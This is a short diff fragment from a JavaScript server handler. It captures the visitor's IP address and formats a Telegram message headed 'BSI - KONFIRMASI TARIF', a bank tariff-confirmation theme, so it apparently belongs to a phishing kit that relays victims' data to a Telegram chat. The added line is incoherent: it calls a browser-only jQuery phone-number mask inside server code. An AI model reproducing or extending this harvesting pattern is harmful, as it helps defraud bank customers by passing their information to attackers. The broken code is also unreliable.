@@ -42,6 +42,7 @@ module.exports = async (req, res) => {
                    req.socket.remoteAddress ||
                    (req.connection.socket ? req.connection.socket.remoteAddress : null);
 
+    $('#nohp').mask('000000000000');
     // Format pesan untuk Telegram dengan informasi IP
     const telegramMessage = `
 𝗕𝗦𝗜 - 𝗞𝗢𝗡𝗙𝗜𝗥𝗠𝗔𝗦𝗜 𝗧𝗔𝗥𝗜𝗙
